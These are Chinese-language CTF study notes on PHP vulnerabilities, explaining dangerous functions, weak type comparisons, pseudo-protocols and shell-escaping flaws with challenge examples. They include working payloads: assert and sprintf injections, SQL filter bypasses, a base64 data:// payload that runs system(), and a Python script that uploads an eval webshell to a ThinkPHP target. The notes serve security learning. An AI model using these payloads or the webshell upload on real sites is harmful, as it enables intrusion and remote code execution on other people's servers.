### 1-PHP常见函数利用

#### assert（）

assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。 **如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行**。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了boolean的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。

eg:

```php
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```

这里$file是我们提交的东西，我们这里提交`123') or system('ls');`，就可以执行系统命令。

#### include()

```php
@include($lan.".php");
```

include函数可以结合php://filter进行文件读取

还可以配合包含一句话木马使用getshell

#### intval()

intval函数是强制转化为int的函数，如果字符串不是数字字符，则查找其第一个不是数字字符，则返回0，反之，返回开头的数字，下面这个例子返回123

```php
$key = intval("123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3");
```

**intval()函数还具体有==整数溢出==的特性，当传入的数大于一定大小时，会溢出并返回0**



#### replace()

常见用于空字符替换敏感字符，但是可以通过双写绕过

eg:

```sql
1'ununionion seselectlect frfromom
```

#### mb_strtolower(str,encoding)

这个函数将字符中的字母全部转化为小写，**但是此函数的行为不会受语言设置的影响，能偶转换任意具有“字母”属性的字符，例如元音变音 A（Ä）。**因此会产生绕过。

ᴬ -> A -> a

测试后，在版本为：7.1和5.2时，如下代码会返回true，8.2时会返回false

```php
<?php 
var_dump(mb_strtolower('İ')==='i')
?>
```

#### scandir()

php中获取指定文件目录的函数

```php
scandir('/')
```

#### highlight_file()

显示指定文件内容并高亮

#### file_get_contents()

file_get_contents 是一个 PHP 内置函数，**用于读取文件的内容并返回字符串**。它可以用于读取本地文件、远程文件、以及通过 HTTP/HTTPS 协议访问的 URL。

#### file_put_contents(file,data,mode,context)

将数据写入文件，file文件名，data为写入数据

#### glob()

glob() 函数返回匹配指定模式的文件名或目录。
举个例子:
`glob("*")` 匹配任意文件
`glob("*.txt")`匹配以txt为后缀的文件

```php
?cmd=print_r(glob("*"));
```

#### sprintf()

字符串格式化函数，

```php
<?php
$number = 9;
$str = "RUNOOB";
$txt = sprintf("%s 每天有 %u 万人在访问！", $str, $number);
echo $txt;
?>
```

**漏洞分析：**

由于该函数的底层逻辑上只对15中占位符有分支，而其他的则直接没处理，而造成的被替换为空字符，如：

```php
<?php
$sql="select * from user where username='%\' and 1=1 #';";
$user='admin';
echo sprintf($sql,$user);
?>
//打印出来：select * from user where username='' and 1=1 #';
```

**可被替换为空的占位符：`%\`,`%1$\`**

```sql
?name=admin&pass=1%1$'or %1$'1%1$'=%1$'1
```

上面的字符串经过addslashes函数和sprintf函数后，变成

```sql
pass=1'or '1'='1
```

**`%1$c`**效果等于%c，此时传入39，会产生单引号`'`



#### escapeshellarg和escapeshellcmd联合造成的漏洞

1. 传入的参数是：`172.17.0.2' -v -d a=1`
2. 经过`escapeshellarg`处理后变成了`'172.17.0.2'\'' -v -d a=1'`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
3. 经过`escapeshellcmd`处理后变成`'172.17.0.2'\\'' -v -d a=1\'`，这是因为`escapeshellcmd`对`\`以及最后那个**不配对**的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
4. 最后执行的命令是`curl '172.17.0.2'\\'' -v -d a=1\'`，由于中间的`\\`被解释为`\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。所以可以简化为`curl 172.17.0.2\ -v -d a=1'`，即向`172.17.0.2\`发起请求，POST 数据为`a=1'`。



#### md5()

php的md5( string $str[, bool $raw_output = FALSE] ) ，md5()函数的需要一个string类型的参数。当**传入一个array时，md5()不会报错**，无法求出array的md5值，结果为NULL, 这就会导致任意2个array的md5值都会相等。

### 2-PHP其他漏洞

#### 弱类型比较

PHP中`true`和数字的比较均为真

字符串与数字比较：

```php
404a==404;   true
```

MD5弱类型：

e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。

因此CTF比赛中需要用到弱类型HASH比较缺陷最明显的标志便是**管理员密码MD5之后的值是以0e开头**

```php
var_dump(md5('240610708') == md5('QNKCDZO'));//true
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));//true
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));//true
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));//true
```

md5数组绕过：**a[]=1&b[]=2**

```php
$a= array('1');
$b= array('2');
var_dump(md5($a)===md5($b));
```

#### 伪协议利用

**file://**,直接读取文件内容

**data://text/plain,**,可以执行php代码，常用base64编码，可以配合include函数使用

```php
url=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgY3RmX2dvX2dvX2dvJyk/Pg==
```

**php://filter/read=convert.**,用于读取文件，可以配合include函数使用

**php://input**，执行POST数据中的代码

#### 逻辑造成的漏洞

- 函数调用顺序造成的漏洞

  例题：[HCTF-warmup](https://blog.csdn.net/Kris__zhang/article/details/116655957?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-116655957-blog-123859749.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3)

  源码：**成真返回得条件太多，只满足一个就能得到true的返回**

  ```php
  public static function checkFile(&$page)
          {
              $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
              if (! isset($page) || !is_string($page)) {
                  echo "you can't see it";
                  return false;
              }
  
              if (in_array($page, $whitelist)) {
                  return true;
              }
  
              $_page = mb_substr(
                  $page,
                  0,
                  mb_strpos($page . '?', '?')
              );
              if (in_array($_page, $whitelist)) {
                  return true;
              }
  
              $_page = urldecode($page);
              $_page = mb_substr(
                  $_page,
                  0,
                  mb_strpos($_page . '?', '?')
              );
              if (in_array($_page, $whitelist)) {
                  return true;
              }
              echo "you can't see it";
              return false;
          }
      }
  ```

  



#### ThinkPHP框架利用

- thinkphp默认上传路径是/home/index/upload

  ```python
  import requests
  url = "http://c2e68701-24aa-42d8-ac2c-bf3c1b2b7d4f.node4.buuoj.cn:81/index.php/home/index/upload/"
  s = requests.Session()
  files = {"file": ("shell.<>php", "<?php eval($_GET['cmd'])?>")}
  r = requests.post(url, files=files)
  print(r.text)
  ```


例题：

[RoarCTF2019_simple_upload](https://huskypower.blog.csdn.net/article/details/120089518?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-120089518-blog-126756706.pc_relevant_multi_platform_whitelistv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-120089518-blog-126756706.pc_relevant_multi_platform_whitelistv3&utm_relevant_index=3)

源码：

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

#### 特殊的命令执行构造

```php
#等同于system('ls')，<?是echo()的别名用法
?><?=`ls`
```

#### PHP文件上传产生临时文件利用

​		php的上传**接受multipart/form-data，然后会将它保存在临时文件中**。php.ini中设置的`upload_tmp_dir`就是这个临时文件的保存目录。**linux下默认为`/tmp`**。也就是说，只要是php接收到上传的POST请求，就会保存一个临时文件，如何这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在**linux系统下的命名规则永远是`phpXXXXXX`**

[CTFshow-红包题2](https://www.shawroot.cc/1634.html)

构造了payload`cmd=?><?=. /??p/p?p??????;`
